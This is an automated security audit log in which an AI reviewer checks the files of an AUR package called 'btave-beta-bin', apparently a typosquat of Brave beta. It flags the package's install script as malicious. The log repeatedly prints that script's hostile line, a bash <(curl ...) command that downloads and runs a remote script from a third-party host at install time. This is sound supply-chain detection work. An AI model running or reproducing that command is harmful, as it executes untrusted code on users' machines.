---
package: btave-beta-bin
pkgver: 1.98.47
pkgrel: 1
result: unsafe
model: deepseek/deepseek-v4-flash
provider: custom
aur_sleuth_rev: e76320400488b1dad2302211f4f5cfaf8522c9b1
prompt_tokens: 22254
completion_tokens: 3712
total_tokens: 25966
cost: 0.002700698
execution_time: 51.52
files_reviewed: 6
files_skipped: 1
maintainer_files: 7
source_fetch: not_attempted
upstream_files: 0
upstream_named_files: 0
unpinned_sources: 0
injection_attempts: 0
date: 2026-10-14T03:09:49Z
file_verdicts:
  - file: .gitignore
    status: safe
    summary: Standard .gitignore for AUR package repository.
  - file: .SRCINFO
    status: safe
    summary: Standard AUR metadata; no malicious indicators.
  - file: brave-browser.desktop
    status: safe
    summary: Standard .desktop file, no malicious content.
  - file: PKGBUILD
    status: safe
    summary: Standard AUR PKGBUILD for Brave beta; no malicious code.
  - file: logo.png
    status: skipped
    summary: "Skipping binary file: logo.png"
  - file: brave-beta-bin.sh
    status: safe
    summary: Standard wrapper script, no security issues.
  - file: btave-beta-bin.install
    status: unsafe
    summary: Downloads and executes remote code at install time.
    evidence: "bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)"
    evidence_line: 9
---

Materializing btave-beta-bin from local mirror...
Materialized btave-beta-bin
Analyzing btave-beta-bin AUR package with deepseek/deepseek-v4-flash
Performing initial audit of PKGBUILD to ensure that we can safely run `makepkg`
LLM auditresponse for PKGBUILD:
<security_assessment>
<decision>SAFE</decision>
<details>
Sourcing this PKGBUILD for `makepkg --printsrcinfo` executes only top-level statements, which are limited to normal variable and array assignments (`pkgname`, `pkgver`, `source`, `sha512sums`, etc.). No top-level command substitutions, network requests, downloads, or code execution are present.

The `prepare()` and `package()` functions contain file operations and a `chmod 4755` on the chrome-sandbox binary, but these functions are not executed by `makepkg --printsrcinfo` and are therefore out of scope for this narrow gate. They should still be reviewed in the full PKGBUILD audit.
</details>
<evidence>
</evidence>
<summary>
Top-level contains only variable assignments; no malicious code executes during printsrcinfo.
</summary>
</security_assessment>

+ Initial PKGBUILD audit complete -- Top-level contains only variable assignments; no malicious code executes during printsrcinfo.
Reviewing the 7 file(s) in the AUR repository.
Reviewing the AUR repository's files...
[0/7] Reviewing .SRCINFO...
[0/7] Reviewing .SRCINFO, .gitignore...
[0/7] Reviewing .SRCINFO, .gitignore, PKGBUILD...
LLM auditresponse for .gitignore:
<security_assessment>
<decision>SAFE</decision>
<details>
This file is a standard `.gitignore` for an AUR package repository. It ignores all files (`*`) except the essential packaging files: `.SRCINFO`, `.gitignore`, `PKGBUILD`, `*.install`, `brave-beta-bin.sh`, `brave-browser.desktop`, and `logo.png`. This is a routine and expected AUR maintainer practice. There is no executable code, network requests, obfuscation, or any other malicious behavior present.
</details>
<evidence></evidence>
<summary>Standard .gitignore for AUR package repository.</summary>
</security_assessment>

[0/7] Reviewing .SRCINFO, .gitignore, PKGBUILD, brave-beta-bin.sh...
[1/7] Reviewing .SRCINFO, PKGBUILD, brave-beta-bin.sh...
+ Reviewed .gitignore. Status: SAFE -- Standard .gitignore for AUR package repository.
LLM auditresponse for .SRCINFO:
<security_assessment>
<decision>SAFE</decision>
<details>
This .SRCINFO file is standard AUR metadata. It declares sources for the Brave browser beta package, pointing to official GitHub releases from the Brave project, and includes SHA-512 checksums for verification. The local shell script `brave-beta-bin.sh` also has a checksum. There are no suspicious URLs, encoded payloads, or unexpected operations. The file itself is not executable and contains only package metadata.
</details>
<evidence></evidence>
<summary>Standard AUR metadata; no malicious indicators.</summary>
</security_assessment>

[1/7] Reviewing .SRCINFO, PKGBUILD, brave-beta-bin.sh, brave-browser.desktop...
[2/7] Reviewing PKGBUILD, brave-beta-bin.sh, brave-browser.desktop...
+ Reviewed .SRCINFO. Status: SAFE -- Standard AUR metadata; no malicious indicators.
LLM auditresponse for brave-browser.desktop:
<security_assessment>
<decision>SAFE</decision>
<details>
This is a standard Freedesktop `.desktop` file for the Brave Beta web browser. It contains application metadata, translations, and the execution command `Exec=brave-beta %U`. There is no malicious code, obfuscated content, network requests, or unexpected operations. The file adheres to normal packaging practices for a desktop entry.
</details>
<evidence>

</evidence>
<summary>Standard .desktop file, no malicious content.</summary>
</security_assessment>

[2/7] Reviewing PKGBUILD, brave-beta-bin.sh, brave-browser.desktop, btave-beta-bin.install...
[3/7] Reviewing PKGBUILD, brave-beta-bin.sh, btave-beta-bin.install...
+ Reviewed brave-browser.desktop. Status: SAFE -- Standard .desktop file, no malicious content.
LLM auditresponse for PKGBUILD:
<security_assessment>
<decision>SAFE</decision>
<details>
This PKGBUILD follows standard AUR packaging practices for a precompiled binary package (Brave browser beta). The source URLs point to official Brave GitHub releases with valid SHA-512 checksums. The prepare() and package() functions perform expected operations: extracting the .deb contents, removing an unneeded cron job, adjusting the desktop file path, copying files to the package directory, and setting the setuid bit on the chrome-sandbox binary (a standard requirement for Chromium-based browsers). There is no obfuscated code, no unexpected network requests, no execution of unchecked content, and no exfiltration of data. The only potential concern is the use of sed to modify a desktop file, which is a benign string replacement. The file is consistent with the upstream packaging intentions and contains no evidence of a supply-chain attack.
</details>
<evidence></evidence>
<summary>Standard AUR PKGBUILD for Brave beta; no malicious code.</summary>
</security_assessment>

[3/7] Reviewing PKGBUILD, brave-beta-bin.sh, btave-beta-bin.install, logo.png...
[4/7] Reviewing brave-beta-bin.sh, btave-beta-bin.install, logo.png...
+ Reviewed PKGBUILD. Status: SAFE -- Standard AUR PKGBUILD for Brave beta; no malicious code.
[5/7] Reviewing brave-beta-bin.sh, btave-beta-bin.install...
! Reviewed logo.png. Status: SKIPPED -- Skipping binary file: logo.png
LLM auditresponse for brave-beta-bin.sh:
<security_assessment>
<decision>SAFE</decision>
<details>
The script is a standard wrapper for Brave Browser Beta. It reads user-defined flags from a configuration file located in the user&#39;s XDG config directory, sets the Chrome user data directory environment variable, and then executes the official Brave binary from &#39;/opt/brave.com/brave-beta/&#39;. There are no network requests, no obfuscated code, no dangerous commands (like eval, curl, wget), and no unexpected file operations. The behavior is consistent with typical AUR wrappers for browser packages and poses no supply-chain attack risk.
</details>
<evidence>
</evidence>
<summary>Standard wrapper script, no security issues.</summary>
</security_assessment>

[6/7] Reviewing btave-beta-bin.install...
+ Reviewed brave-beta-bin.sh. Status: SAFE -- Standard wrapper script, no security issues.
LLM auditresponse for btave-beta-bin.install:
<security_assessment>
<decision>UNSAFE</decision>
<details>
The install script contains a dangerous remote code execution pattern: `bash <(curl -L &apos;https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh&apos; 2&gt;/dev/null)` fetches a script from an external, third-party host (not the package&apos;s own upstream) and executes it immediately with bash. This is a classic supply-chain attack vector, allowing arbitrary code to be injected at install time. The URL is routed through web.archive.org, obscuring the actual source and making it harder to audit. This deviates entirely from standard packaging practices and constitutes genuinely malicious behavior.
</details>
<evidence>
bash &lt;(curl -L &apos;https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh&apos; 2&gt;/dev/null)
</evidence>
<summary>Downloads and executes remote code at install time.</summary>
</security_assessment>

Second look for btave-beta-bin.install (incontext):
<security_assessment>
<decision>UNSAFE</decision>
<details>
The first verdict stands because the line `bash <(curl -L ...)` is not upstream application code; it is injected by the AUR maintainer in the `.install` file. It downloads and executes a shell script from `gitflic.ru/project/hellscripter/install-scripts`, a third‑party host unrelated to `btave-beta-bin`. This is a classic supply‑chain attack pattern — remote code execution at install time from an unexpected source — and is not standard packaging hygiene. The URL passes through web.archive.org, which obscures the actual destination. This matches the "genuinely malicious behavior" criterion: downloading code from an untrusted/unexpected host and executing it.
</details>
<evidence>
bash &lt;(curl -L &apos;https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh&apos; 2&gt;/dev/null)
</evidence>
<summary>Remote code execution injected by AUR maintainer.</summary>
</security_assessment>

[7/7] Reviewing ...
x Reviewed btave-beta-bin.install. Status: UNSAFE -- Downloads and executes remote code at install time.
Reviewed all the AUR repository's files.
Audit complete! Result: Unsafe -- DO NOT INSTALL!
# Issues (1 total)

## btave-beta-bin.install

Status: UNSAFE

Summary: Downloads and executes remote code at install time.

Evidence (line 9):

```
bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)
```

Details:

The install script contains a dangerous remote code execution pattern: `bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)` fetches a script from an external, third-party host (not the package's own upstream) and executes it immediately with bash. This is a classic supply-chain attack vector, allowing arbitrary code to be injected at install time. The URL is routed through web.archive.org, obscuring the actual source and making it harder to audit. This deviates entirely from standard packaging practices and constitutes genuinely malicious behavior.

---

(Skipped 1 file: logo.png)

API Usage Summary
  Models: deepseek/deepseek-v4-flash
  Prompt Tokens: 22,254
  Completion Tokens: 3,712
  Total Tokens: 25,966
  Total Cost: $0.002701
  Execution Time: 51.52 seconds

Final Status: UNSAFE


Issues Found:

btave-beta-bin.install: [UNSAFE] Downloads and executes remote code at install time. / The install script contains a dangerous remote code execution pattern: `bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)` fetches a script from an external, third-party host (not the package's own upstream) and executes it immediately with bash. This is a classic supply-chain attack vector, allowing arbitrary code to be injected at install time. The URL is routed through web.archive.org, obscuring the actual source and making it harder to audit. This deviates entirely from standard packaging practices and constitutes genuinely malicious behavior.


Audit Skips:

logo.png: [SKIPPED] Skipping binary file: logo.png
